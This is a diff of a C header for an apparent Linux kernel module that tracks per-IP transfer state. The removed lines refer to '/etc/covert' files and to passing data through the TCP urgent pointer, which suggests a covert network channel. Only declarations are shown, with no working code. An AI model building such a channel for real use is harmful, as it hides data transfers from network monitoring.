@@ -1,92 +1,67 @@
-#ifndef __RECV_DATA_H
-#define __RECV_DATA_H
+#ifndef _DATA_H
+#define _DATA_H
 
 #include <linux/slab.h>
 #include <linux/skbuff.h>
-#include "file_io.h"
-#include "functions.h"
-#include "file_hash.h"
-#include "time.h"
-
-#define __BLOCK 20
-#define __HASH_SIZE 20
-#define __FILE_RECV "/etc/covert/recvdata"
-#define __FILE_NAME "/etc/covert/data"
 
 enum STATUS
 {
-    __STOP,
-    __WAIT,
-    __FILE,
-    __HASH,
-    __REST,
-    __FINI
+    _WAIT,
+    _SEND,
+    _RECV,
+    _CHEK,
+    _FINI,
+    _STOP,
+    _NULL
 };
 
-enum RESPON
-{
-    __REOK,
-    __RESD,
-    __REFI
-};
-
-struct DataRaw
+typedef struct _data_raw
 {
     unsigned int ip;
-    int time; //
-    int type;
     int size;
-    int state;
-    int sstate;
-    int pos;
-    int hash_pos;
-    unsigned char hash[__HASH_SIZE];
+    int r_state;
+    int s_state;
+    int cont_pos;
     char* content;
-};
+} Data;
 
-struct MapList
+struct _map_node
 {
-    struct DataRaw* raw_data;
-    struct MapList* next;
+    unsigned int ip;
+    Data *data;
 };
 
-struct Map
+typedef struct _map
 {
     int count;
-    int cooldown;
-    struct MapList* list;
-};
+    int size;
+    struct _map_node *maps;
+} Map;
 
-int data_getState(struct DataRaw* data_ptr);
-int data_getSstate(struct DataRaw* data_ptr);
+static Map map;
 
-struct DataRaw* data_new(unsigned int IP, int size);
-struct DataRaw* data_reset(struct DataRaw* data_ptr, unsigned int IP, int size);
-struct DataRaw* data_saveToFile(struct DataRaw* data_ptr);
-struct DataRaw* data_setState(struct DataRaw* data_ptr, int state);
-struct DataRaw* data_setSstate(struct DataRaw* data_ptr, int sstate);
-struct DataRaw* data_appendData(struct DataRaw* data_ptr, const void* data, int size);
-struct DataRaw* data_appendHash(struct DataRaw* data_ptr, const void* data, int size);
-struct DataRaw* data_respon(struct DataRaw* data_ptr, unsigned short* urg_ptr);
-struct DataRaw* data_send(struct DataRaw* data_ptr, unsigned short* urg_ptr);
+Data *_append(unsigned int);
 
-struct MapList* map_append(struct Map* map, unsigned int IP, int size);
-void map_delete(struct Map* map, unsigned int IP);
-struct DataRaw* map_reset(struct Map* map, unsigned int IP, int size);
-struct DataRaw* map_saveToFile(struct Map* map, unsigned int IP);
-struct DataRaw* map_setState(struct Map* map, unsigned int IP, int state);
-struct Map* map_loadFromFile(struct Map* map, const char* file);
-struct DataRaw* map_appendData(struct Map* map, unsigned int IP, char *data, int size);
-struct DataRaw* map_appendHash(struct Map* map, unsigned int IP, char *data, int size);
-struct DataRaw* map_findData(struct Map* map, unsigned int IP);
-struct MapList* map_findParent(struct Map* map, unsigned int IP);
+void append_data(unsigned int, int);
 
-struct DataRaw* map_recv(struct Map* map, unsigned int IP, unsigned short urg_data);
-struct DataRaw* map_respon(struct Map* map, unsigned int IP, unsigned short* urg_ptr);
-struct DataRaw* map_send(struct Map* map, unsigned int IP, unsigned short* urg_ptr);
-struct DataRaw* map_recrpn(struct Map* map, unsigned int IP, unsigned short urg_data);
+Data *find_data(unsigned int ip);
 
-void printMapChildren(struct Map *map);
+void del_data(unsigned int ip);
 
-#include "data.c"
+int add_content(unsigned int ip, const void *m, int size);
+
+void *get_content(unsigned int ip, void *m, int size);
+
+unsigned short check_chk(unsigned int ip);
+
+int get_data_content(unsigned int ip, int size, void *buf);
+
+int get_rstate(unsigned int ip);
+
+int get_sstate(unsigned int ip);
+
+int set_rstate(unsigned int ip, int state);
+
+int set_sstate(unsigned int ip, int state);
+
 #endif
